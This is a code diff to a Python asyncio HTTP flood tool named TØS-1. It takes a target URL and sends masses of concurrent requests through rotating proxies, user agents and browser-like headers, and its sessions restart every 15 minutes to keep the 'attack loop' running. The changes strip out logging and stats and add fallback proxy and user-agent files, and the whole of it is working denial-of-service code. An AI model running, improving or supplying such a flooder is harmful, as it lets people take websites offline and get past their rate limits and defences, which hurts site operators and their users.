@@ -4,9 +4,6 @@ import random
 import time
 import os
 import sys
-from datetime import datetime
-import psutil
-import threading
 
 class TOS1:
     def __init__(self, target_url):
@@ -27,19 +24,8 @@ class TOS1:
         self.current_proxy = ""
         self.current_ua = ""
         
-        # Stats
-        self.requests_since_last = 0
-        self.last_rps_calc = time.time()
-        self.current_rps = 0
-        self.peak_rps = 0
-        
-        # Maintenance
-        self.last_maintenance = time.time()
-        self.maintenance_interval = 900  # 15 minutes
-        
-        # Performance control
-        self.cpu_target = 0.89
-        self.concurrency = 1000
+        # Concurrency control (no CPU monitoring)
+        self.concurrency = 500
         self.semaphore = asyncio.Semaphore(self.concurrency)
         
         # Session
@@ -55,7 +41,7 @@ class TOS1:
     
     def generate_real_headers(self):
         """Generate realistic looking headers"""
-        base_headers = [
+        return [
             {
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                 'Accept-Language': 'en-US,en;q=0.5',
@@ -65,7 +51,6 @@ class TOS1:
                 'Sec-Fetch-Dest': 'document',
                 'Sec-Fetch-Mode': 'navigate',
                 'Sec-Fetch-Site': 'none',
-                'Sec-Fetch-User': '?1',
                 'Cache-Control': 'max-age=0'
             },
             {
@@ -76,17 +61,8 @@ class TOS1:
                 'Sec-Fetch-Dest': 'empty',
                 'Sec-Fetch-Mode': 'cors',
                 'Sec-Fetch-Site': 'same-origin'
-            },
-            {
-                'Accept': '*/*',
-                'Accept-Language': 'en-US,en;q=0.5',
-                'Accept-Encoding': 'gzip, deflate',
-                'Connection': 'keep-alive',
-                'Origin': 'https://www.google.com',
-                'Referer': 'https://www.google.com/'
             }
         ]
-        return base_headers
     
     def rotate_resources(self):
         """Rotate proxy, UA, and headers"""
@@ -100,27 +76,10 @@ class TOS1:
         if self.current_ua:
             self.current_headers['User-Agent'] = self.current_ua
     
-    def check_cpu(self):
-        """Monitor and adjust CPU usage"""
-        cpu_percent = psutil.cpu_percent(interval=0.1)
-        
-        if cpu_percent > self.cpu_target * 100:
-            self.concurrency = max(100, self.concurrency - 50)
-            self.semaphore = asyncio.Semaphore(self.concurrency)
-        elif cpu_percent < self.cpu_target * 100 * 0.8:
-            self.concurrency = min(5000, self.concurrency + 50)
-            self.semaphore = asyncio.Semaphore(self.concurrency)
-    
     async def create_session(self):
         """Create aiohttp session"""
-        connector = aiohttp.TCPConnector(
-            limit=0,
-            limit_per_host=0,
-            ttl_dns_cache=300,
-            force_close=True
-        )
-        
-        timeout = aiohttp.ClientTimeout(total=10)
+        connector = aiohttp.TCPConnector(limit=0, force_close=True)
+        timeout = aiohttp.ClientTimeout(total=5)
         self.session = aiohttp.ClientSession(
             connector=connector,
             timeout=timeout
@@ -143,28 +102,15 @@ class TOS1:
                 ) as response:
                     await response.read()
                     
-            except Exception as e:
+            except:
                 pass  # Silent fail
             
             finally:
                 self.total_requests += 1
-                self.requests_since_last += 1
-    
-    def calculate_rps(self):
-        """Calculate current RPS"""
-        now = time.time()
-        elapsed = now - self.last_rps_calc
-        
-        if elapsed >= 0.001:  # Every millisecond
-            self.current_rps = self.requests_since_last / elapsed
-            self.peak_rps = max(self.peak_rps, self.current_rps)
-            self.requests_since_last = 0
-            self.last_rps_calc = now
     
     def update_display(self):
-        """Update display overwriting every millisecond"""
-        self.calculate_rps()
-        sys.stdout.write(f"\rTØS-TRS — {self.total_requests} | {{S023, TØS-RR}}")
+        """Update display - ONLY THIS LOGGING"""
+        sys.stdout.write(f"\rTØS-1 — {self.total_requests} | {{S023}}")
         sys.stdout.flush()
     
     async def maintenance(self):
@@ -172,15 +118,15 @@ class TOS1:
         while self.running:
             current_time = time.time()
             
-            if current_time - self.last_maintenance >= self.maintenance_interval:
-                print(f"\n[!] TØS-MAINTENANCE ACTIVE")
+            if current_time - self.last_maintenance >= 900:  # 15 minutes
                 self.attack_active = False
                 
                 # Close old session
                 if self.session:
                     await self.session.close()
+                    self.session = None
                 
-                # Clear junk
+                # Clear and rotate resources
                 self.rotate_resources()
                 
                 # Create new session
@@ -189,7 +135,6 @@ class TOS1:
                 # Wait a moment
                 await asyncio.sleep(2)
                 
-                print("[+] MAINTENANCE COMPLETE")
                 self.attack_active = True
                 self.last_maintenance = current_time
             
@@ -199,14 +144,13 @@ class TOS1:
         """Main attack loop"""
         await self.create_session()
         self.rotate_resources()
+        self.last_maintenance = time.time()
         
         # High RPS loop
         while self.running and self.attack_active:
-            self.check_cpu()
-            
             # Send batch of requests
             tasks = []
-            for _ in range(min(self.concurrency, 100)):
+            for _ in range(min(self.concurrency, 50)):
                 tasks.append(self.send_request())
             
             if tasks:
@@ -214,18 +158,15 @@ class TOS1:
             
             self.update_display()
             
-            # Small delay to prevent event loop blockage
+            # Small delay
             await asyncio.sleep(0.0001)
     
     async def run(self):
         """Main run method"""
         # Initial display
-        print("\n" + "="*40)
         print("𝖳Ø𝖲-1 | 𝖲023")
-        print("="*40)
-        
         await asyncio.sleep(2)
-        os.system('clear' if os.name == 'posix' else 'cls')
+        os.system('clear')
         
         # Start maintenance in background
         maintenance_task = asyncio.create_task(self.maintenance())
@@ -240,41 +181,29 @@ class TOS1:
             if self.session:
                 await self.session.close()
             
-            # Final stats
-            runtime = time.time() - self.start_time
-            avg_rps = self.total_requests / runtime if runtime > 0 else 0
-            
-            print(f"\n\n=== TØS-1 FINAL STATS ===")
-            print(f"Total Requests: {self.total_requests:,}")
-            print(f"Peak RPS: {self.peak_rps:,.1f}")
-            print(f"Average RPS: {avg_rps:,.1f}")
-            print(f"Runtime: {runtime:.1f}s")
-            print("="*30)
+            # NO FINAL STATS - just exit
+            sys.exit(0)
 
 # Main execution
 if __name__ == "__main__":
     if len(sys.argv) < 2:
-        print("Usage: python tos1.py https://target.com")
         sys.exit(1)
     
     target = sys.argv[1]
     
     # Check for required files
     if not os.path.exists("main.txt"):
-        print("Error: main.txt not found (proxies)")
-        sys.exit(1)
+        # Create empty if doesn't exist (will run without proxies)
+        with open("main.txt", "w") as f:
+            pass
     
     if not os.path.exists("ua.txt"):
-        print("Error: ua.txt not found (user agents)")
-        sys.exit(1)
+        # Create default UAs
+        with open("ua.txt", "w") as f:
+            f.write("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n")
+            f.write("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36\n")
     
     tos = TOS1(target)
     
-    # Run with high priority
-    try:
-        if os.name == 'posix':
-            os.nice(-20)  # Max priority on Linux
-    except:
-        pass
-    
+    # Run
     asyncio.run(tos.run())
